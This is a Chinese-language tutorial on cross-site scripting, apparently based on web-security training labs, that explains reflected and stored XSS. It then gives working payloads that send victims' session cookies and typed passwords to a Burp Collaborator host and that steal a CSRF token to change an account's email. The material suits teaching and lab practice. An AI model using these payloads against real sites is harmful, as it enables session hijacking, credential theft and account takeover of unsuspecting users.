XSS及其漏洞利用

跨站脚本（也称为XSS）是一种网络安全漏洞，允许攻击者破坏用户与易受攻击应用的交互。跨站脚本通过控易受攻击的网站，使其返回恶意JavaScript给用户来实现。当恶意代码在受害者浏览器内执行时，攻击者可以完全破坏与应用的交互。

反射XSS#

反射跨站脚本（或称XSS）是指应用程序在HTTP请求中接收数据后，以不安全的方式将该数据包含在即时响应中。假设一个网站有一个搜索功能，能够接收用户提供的搜索词，并设置一个URL参数：

https://insecure-website.com/search?term=gift

该应用在对该URL的回复中呼应了所提供的搜索词：

<p>You searched for: gift</p>

假设应用程序不对数据进行其他处理，攻击者可以构造如下攻击：

https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>

该网址引出以下回复：

<p>You searched for: <script>/* Bad stuff here... */</script></p>

如果应用的其他用户请求攻击者的URL，攻击者提供的脚本将在受害者用户的浏览器中执行，且是在其与应用会话的上下文中。

例如，简单地输入：

1<script>alert(1)</script>

就可以弹出内容为“1”的窗口。

存储 XSS#

存储的XSS（也称为持久XSS）是指应用程序从不受信任的来源接收数据，并在后续的HTTP响应中以不安全的方式包含该数据。反射型 XSS 和存储型 XSS 的关键区别在于，存储的 XSS 漏洞使攻击能够在应用内部自包含。攻击者无需寻找外部方法诱使其他用户发出包含其漏洞利用的特定请求。相反，攻击者将漏洞植入应用本身，等待用户发现。

例如，在评论中输入

1<script>alert(1)</script>

每次返回评论页面都会触发弹窗。

利用XSS漏洞#

窃取cookie#

例如，我们要模拟受害者用户，查看所有评论发布后的页面。要实现这个目标，需要利用漏洞窃取受害者的会话Cookie，然后用该Cookie冒充受害者。在评论框有一个基础的存储型XSS漏洞。于是，输入以下payload：

1<script>
2fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
3method: 'POST',
4mode: 'no-cors',
5body:document.cookie
6});
7</script>

其中的网址就是 Burp Collaborator 生成的服务器网址。这样，在这个服务器上就能得到受害者的cookie的session等。在主页面替换cookie即可。

捕获密码#

漏洞于上面类似，只不过这次直接获取受害者的登录名和密码。仍然是类似的步骤，在评论区输入payload:

1<input name=username id=username>
2<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
3method:'POST',
4mode: 'no-cors',
5body:username.value+':'+this.value
6});">

绕过CRSF#

一些网站允许登录用户无需重新输入密码即可更改电子邮件地址。如果在这些网站上发现了XSS漏洞，可以利用它来窃取CSRF令牌。有了令牌，就可以将受害者的电子邮件地址更改为自己控制的邮箱。然后触发密码重置以获得账户访问权限。

这种利用方式结合了XSS（窃取CSRF令牌）与CSRF通常针对的功能。传统CSRF是一种“单向”漏洞，攻击者可以诱使受害者发送请求但看不到响应，而XSS则实现了“双向”通信。这使得攻击者既能发送任意请求，也能读取响应，形成一种绕过反CSRF防御的混合攻击。

比如，下面的payload就：

 1<script>
 2var req = new XMLHttpRequest();
 3req.onload = handleResponse;
 4req.open('get','/my-account',true);
 5req.send();
 6function handleResponse() {
 7    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
 8    var changeReq = new XMLHttpRequest();
 9    changeReq.open('post', '/my-account/change-email', true);
10    changeReq.send('csrf='+token+'&email=test@test.com')
11};
12</script>
